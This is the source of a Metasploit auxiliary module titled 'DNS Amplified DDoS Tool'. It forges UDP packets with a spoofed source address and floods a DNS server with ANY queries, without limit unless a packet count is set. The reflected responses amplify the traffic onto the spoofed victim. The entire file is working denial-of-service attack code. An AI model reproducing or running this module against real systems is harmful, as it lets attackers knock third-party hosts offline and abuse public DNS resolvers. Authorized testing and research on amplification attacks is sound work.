##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'        => 'DNS Amplified DDoS Tool',
      'Description' => 'DDoS attack using reflected DNS ANY queries for amplification',
      'Author'      => 'Hayden Parker',
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(53),
      OptAddress.new('SHOST', [true, 'The spoofable source address']),
      OptAddress.new('RHOSTS', [false, 'The DNS server to query']),
      OptString.new('INTERFACE', [false, 'Interface to use', 'eth0']),
      OptString.new('DOMAINNAME', [true, 'Domain to use for the DNS request', 'isc.org' ]),
      OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
      OptInt.new('NUM', [false, 'Number of packets to send'])
    ])

    deregister_options('FILTER','PCAPFILE')
  end

  def sport
    datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
  end

  def rport
    datastore['RPORT'].to_i
  end

  def rhost
    return datastore['RHOSTS']
  end

  def interface
    return datastore['INTERFACE']
  end

  def domain
    targdomainpacket = []
    datastore['DOMAINNAME'].split('.').each do |domainpart|
      # The length of the domain part in hex
      domainpartlength =  "%02x" % domainpart.length
      # Convert the name part to a hex string
      domainpart = domainpart.each_byte.map { |b| b.to_s(16) }.join()
      # Combine the length of the name part and the name part
      targdomainpacket.push(domainpartlength + domainpart)
    end
    targdomainpacket = targdomainpacket.join.to_s
    # Create a correct hex character string to be used in the packet
    targdomainpacket = targdomainpacket.scan(/../).map { |x| x.hex.chr }.join

    return targdomainpacket
  end

  def querypckt
    return "\xff"
  end

  def run
    open_pcap
    sent = 0
    num = datastore['NUM'] || 0
    print_status("Beginning DNS flood...")

#     dns_query.eth_daddr = PacketFu::Utils.whoami?[:eth_daddr]
    p = PacketFu::UDPPacket.new
    p.ip_saddr = datastore['SHOST']
    p.ip_daddr = rhost
    p.udp_dst = rport
    p.udp_src = sport

    while (num <= 0) or (sent < num)
      p.payload = "\x09\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + domain + "\x00\x00" + querypckt + "\x00\x01"
      p.recalc
      break unless capture_sendto(p,rhost)
      sent += 1
    end
	print_status("Attack finished (sent #{sent} packets).")
	close_pcap
  end
end